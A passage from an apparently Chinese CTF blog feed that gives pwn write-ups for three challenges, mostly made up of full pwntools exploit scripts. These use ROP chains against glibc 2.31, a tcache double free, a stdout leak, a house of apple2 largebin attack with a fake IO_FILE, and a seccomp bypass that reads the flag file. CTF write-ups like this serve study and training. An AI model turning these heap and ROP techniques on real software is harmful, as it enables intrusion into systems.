class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x210</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x22</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">6</span><br>payload += (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> * <span class="hljs-number">20</span><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)<br><br>stack_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br><br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rcx_rbx = libcbase + <span class="hljs-number">0x10257e</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment">#open(‘flag&#x27;)</span><br><span class="hljs-comment">#sendfile(1,fd,0,0x100)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xa0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rcx_rbx), p64(<span class="hljs-number">0x100</span>), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">40</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>getchar(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>改用readv函数也可以读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(&#x27;flag&#x27;)</span><br><span class="hljs-comment">#readv(3, iovec, 1)</span><br><span class="hljs-comment">#writev(1, iovec, 1)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xd0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">19</span>),<br>    p64(syscall_ret),<br>    <br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">20</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stack_addr + <span class="hljs-number">0xf0</span>) + p64(<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>也可以使用close函数先关闭标准输入<code>close(0)</code>，再直接orw，这里就不再展示了。</p><h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>本地环境：2.31-0ubuntu9_amd64</p><p>程序在开始时就已经有很多堆块已经被分配释放了（通过动态链接库libseccomp.so.2引入沙盒规则导致的）</p><img src="/img/6/Screenshot_20221201_090534.png" style="zoom: 67%;" /><p>​                                                                                                      </p><p>使用increase函数是对堆块的申请，次数限制为11次；使用decresae函数是释放堆块，次数限制为4次，虽然有uaf，但程序没有edit函数和show函数这种功能，无法对uaf完成有效利用，唯一可以利用的是initial函数，还只能使用一次</p><img src="/img/6/Screenshot_20221201_091349.png" style="zoom:67%;" /><p>如果已经完成了一次堆块的申请并且释放，在此过程就将tcache中的<code>tcache_perthread_struct *key</code>破坏，配合uaf就可以实现tcache的double free。由于申请堆块的大小，释放次数这些限制，我们无法一次性泄漏出libc的基地址。</p><p>在完成double free后，劫持到tcache的结构体头部，就可以直接控制tcache的申请和数量。直接释放tcache的结构体头部得到unsorted bin后，攻击<code>_IO_2_1_stdout_</code>以实现libc基地址的泄漏：</p><img src="/img/6/Screenshot_20221201_102237.jpg" style="zoom: 67%;" /><p>​</p><p>沙盒的存在无法直接拿到shell，需要利用<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>和setcontext劫持rsp，执行ROP或者shellcode。</p><p>在此过程中需要爆破两次地址，有1&#x2F;256的概率拿到flag，在本地运行时可以加上 aslr&#x3D;False，节省本地爆破的时间。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;only&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = process(&#x27;./only&#x27;, aslr=False)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initial</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(b&#x27;Size:&#x27;, str(size).encode())</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">increase</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decresae</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    decresae()<br>    initial()<br>    decresae()<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x10\xc0&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">1</span>)  + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>    increase(<span class="hljs-number">0x70</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    decresae()<br>    increase(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    mp = libcbase + <span class="hljs-number">2011848</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x1547a0</span><br>    setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>    pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>    pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c1e1</span><br>    pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>    ret = libcbase + <span class="hljs-number">0x25679</span><br>    mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>    increase(<span class="hljs-number">0x40</span>, p64(free_hook) + p64(stdout) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xd0</span>, p64(magic_gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><br><br>    payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x140</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>    payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect) + p64(heap_addr + <span class="hljs-number">0x140</span> +<span class="hljs-number">0x70</span>)<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p64(heap_addr + <span class="hljs-number">0x140</span> + <span class="hljs-number">0x28</span>) + p64(ret)<br><br>    increase(<span class="hljs-number">0xe0</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    decresae()<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    <span class="hljs-keyword">try</span> :<br>        p = process(<span class="hljs-string">&#x27;./only&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>​                                                     </p><p>​                        </p><h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p>程序只能使用两次申请堆块，虽然后续也能申请，但无法去使用；留了一个uaf的漏洞，free的次数也只能是4次，edit和show这种函数可以正常使用。如果使用tcache去实现任意写，这两次申请是远远不够用的。这里是使用house of apple2，主要就是利用一次largebin attack攻击去实现劫持IO控制流。</p><p>Roderick师傅的文章已经很详细了：[<a href="https://bbs.pediy.com/thread-273832.htm">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p>​</p><p>当然构造IO_FILE也需要注意<code>_IO_flush_all_lockp</code>函数中的if判断：</p><img src="/img/6/Screenshot_20230103_111938.png" style="zoom: 67%;" /><p>满足前者<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，或者后者&#96;&#96;_IO_vtable_offset (fp) &#x3D;&#x3D; 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base&#96;即可</p><p>​</p><p>进入<code>_IO_wfile_overflow</code>后会有rdx直接赋值为<code>fp-&gt;_wide_data</code>，所以可以直接配合setcontext函数使用</p><img src="/img/6/Screenshot_20230103_095137.jpg" style="zoom: 67%;" /><p>​</p><p>题目中存在沙盒，64位和32的限制都有</p><img src="/img/6/Screenshot_20230103_103656.jpg" style="zoom: 67%;" /><p>但seccomp-tools将32位系统调用号也看成64位的，这就很迷惑人。对比32位的系统表就会发现open的系统调用在32位中的系统调用号为5，这里就先使用32位的open调用号去打开flag文件，再去用64位的读写。由于32位寄存器大小的限制，直接使用pwntools生成的open系统调用会出错，所以先mmap一段低地址内存再去使用。</p><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;store&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./store&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">throw</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>buy(<span class="hljs-number">0x420</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>buy(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak -<span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libcbase))<br><br>buy1(<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall_ret = libcbase + <span class="hljs-number">0x66229</span><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>magic_gadget = libcbase + <span class="hljs-number">0x154930</span><br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">1</span>)<br>buy1(<span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0x860</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                  <span class="hljs-comment">#_lock</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)   <span class="hljs-comment">#_wide_data</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_mode</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)         <span class="hljs-comment">#vtable</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_prt</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x138</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br><br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr - <span class="hljs-number">0x290</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.mmap(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x23000</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                          </p><p>​                                                                          </p><p>参考：<a href="https://blog.wm-team.cn/index.php/archives/34/">强网拟态 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rop Emporinm(MIPS)几道题的wp</title>
    <link href="/2022/11/11/Rop-Emporinm(MIPS)/"/>
    <url>/2022/11/11/Rop-Emporinm(MIPS)/</url>
    
